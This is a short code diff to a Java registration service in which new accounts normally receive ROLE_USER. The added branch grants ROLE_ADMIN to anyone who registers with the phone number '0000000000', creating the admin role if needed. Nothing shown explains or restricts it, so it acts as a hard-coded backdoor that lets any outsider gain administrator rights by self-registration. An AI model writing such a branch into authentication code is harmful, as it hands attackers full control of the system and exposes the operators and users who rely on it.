@@ -67,16 +67,30 @@ public class AuthService {
 		u.setLastName(req.getLastName());
 		u.setPhone(req.getPhone());
 		u.setEnabled(true);
+		
+		if("0000000000".equals(req.getPhone())) {
+			// assign ROLE_ADMIN
+			Role role = roleRepository.findByName("ROLE_ADMIN")
+					.orElseGet(() -> {
+						Role newRole = new Role();
+						newRole.setName("ROLE_ADMIN");
+						return roleRepository.save(newRole);
+					});
 
-		// assign ROLE_USER
-		Role role = roleRepository.findByName("ROLE_USER")
-				.orElseGet(() -> {
-					Role newRole = new Role();
-					newRole.setName("ROLE_USER");
-					return roleRepository.save(newRole);
-				});
+			u.getRoles().add(role);
+		}else {
+			// assign ROLE_USER
+			Role role = roleRepository.findByName("ROLE_USER")
+					.orElseGet(() -> {
+						Role newRole = new Role();
+						newRole.setName("ROLE_USER");
+						return roleRepository.save(newRole);
+					});
 
-		u.getRoles().add(role);
+			u.getRoles().add(role);
+		}
+
+		
 
 		userRepository.save(u);
 	}
